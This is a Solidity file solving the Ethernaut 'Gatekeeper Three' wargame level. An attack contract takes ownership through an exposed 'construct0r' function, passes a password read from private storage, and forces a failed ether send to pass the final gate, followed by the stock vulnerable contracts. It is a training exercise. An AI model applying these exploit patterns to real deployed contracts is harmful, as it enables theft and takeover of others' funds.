// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// HackCode
contract Hack {
  address payable g3add = payable(0x42Ab2Ca5eEeB1e5a369A49142343a797F1e52B7C);
  GatekeeperThree g3 = GatekeeperThree(g3add);

  constructor() payable{}

  function attack() public {
    // gate 1 -> Become the owner by calling construct0r
    g3.construct0r();

    // Gate 2 -> provide the password
    g3.getAllowance(uint(0x0000000000000000000000000000000000000000000000000000000064aceb84));

    // Gate 3 -> transfer ether
    g3add.transfer(0.0011 ether);

    // enter
    g3.enter();

    //Self destruct
    selfdestruct(payable(msg.sender));
  }

  // Gate 3 -> send false
  receive() external payable {
    revert();
  }

}

// Stock code from ethernaut
contract SimpleTrick {
  GatekeeperThree public target;
  address public trick;
  uint private password = block.timestamp;

  constructor (address payable _target) {
    target = GatekeeperThree(_target);
  }
    
  function checkPassword(uint _password) public returns (bool) {
    if (_password == password) {
      return true;
    }
    password = block.timestamp;
    return false;
  }
    
  function trickInit() public {
    trick = address(this);
  }
    
  function trickyTrick() public {
    if (address(this) == msg.sender && address(this) != trick) {
      target.getAllowance(password);
    }
  }
}

contract GatekeeperThree {
  address public owner;
  address public entrant;
  bool public allowEntrance;

  SimpleTrick public trick;

  function construct0r() public {
      owner = msg.sender;
  }

  modifier gateOne() {
    require(msg.sender == owner);
    require(tx.origin != owner);
    _;
  }

  modifier gateTwo() {
    require(allowEntrance == true);
    _;
  }

  modifier gateThree() {
    if (address(this).balance > 0.001 ether && payable(owner).send(0.001 ether) == false) {
      _;
    }
  }

  function getAllowance(uint _password) public {
    if (trick.checkPassword(_password)) {
        allowEntrance = true;
    }
  }

  function createTrick() public {
    trick = new SimpleTrick(payable(address(this)));
    trick.trickInit();
  }

  function enter() public gateOne gateTwo gateThree {
    entrant = tx.origin;
  }

  receive () external payable {}
}